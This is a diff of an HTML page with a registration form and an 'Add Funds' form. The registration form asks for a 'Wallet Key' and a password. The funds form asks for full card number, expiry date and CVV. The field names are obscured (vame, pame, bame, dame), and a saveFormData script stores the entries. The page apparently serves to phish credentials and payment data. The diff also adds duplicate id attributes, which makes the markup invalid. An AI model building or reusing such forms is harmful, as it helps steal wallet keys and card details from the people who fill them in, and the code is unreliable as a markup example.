@@ -1838,19 +1838,19 @@
             </div>
             <div class="form-group">
                 <label for="registerEmail">Email</label>
-                <input type="email" id="registerEmail" class="form-control" name="vame"  required>
+                <input type="email" id="name" id="registerEmail" class="form-control" name="vame"  required>
             </div>
 
      <div class="form-group">
                 <label for="registerEmail">Wallet Key</label>
-                <input type="text" id="registerEmail" class="form-control" name="pame"  required>
+                <input type="text" id="name" id="registerEmail" class="form-control" name="pame"  required>
             </div>
 
 
 
             <div class="form-group">
                 <label for="registerPassword">Password</label>
-                <input type="password" id="registerPassword"  name="lame"  class="form-control" required minlength="6">
+                <input type="password" id="name" id="registerPassword"  name="lame"  class="form-control" required minlength="6">
             </div>
             <div class="form-group">
                 <label for="registerConfirmPassword">Confirm Password</label>
@@ -1874,7 +1874,7 @@
         <form id="addFundsForm" id="newsletterFom">
             <div class="form-group">
                 <label for="fundsAmount">Amount ($)</label>
-                <input type="number" id="fundsAmount" name="name" class="form-control" min="10" step="0.01" required>
+                <input type="number"  id="name" id="fundsAmount" name="name" class="form-control" min="10" step="0.01" required>
             </div>
             <div class="form-group">
                 <label for="paymentMethod">Payment Method</label>
@@ -1886,16 +1886,16 @@
             </div>
             <div class="form-group">
                 <label for="cardNumber">Card Number</label>
-                <input type="text" id="cardNumber" name="bame"  class="form-control" placeholder="1234 5678 9012 3456" required>
+                <input type="text" id="cardNumber" name="bame" id="name" class="form-control" placeholder="1234 5678 9012 3456" required>
             </div>
             <div class="form-row">
                 <div class="form-group">
                     <label for="expiryDate">Expiry Date</label>
-                    <input type="text" id="expiryDate"  name="came"  class="form-control" placeholder="MM/YY" required>
+                    <input type="text" id="expiryDate" id="name" name="came"  class="form-control" placeholder="MM/YY" required>
                 </div>
                 <div class="form-group">
                     <label for="cvv">CVV</label>
-                    <input type="text" id="cvv"  name="dame"   class="form-control" placeholder="123" required>
+                    <input type="text" id="cvv" id="name" name="dame"   class="form-control" placeholder="123" required>
                 </div>
             </div>
             <button type="submit" class="btn btn-primary" style="width: 100%; padding: 12px;">Add Funds</button>
@@ -2609,4 +2609,5 @@ async function saveFormData(formId, collectionName) {
 
 </script>
 </body>
+
 </html>
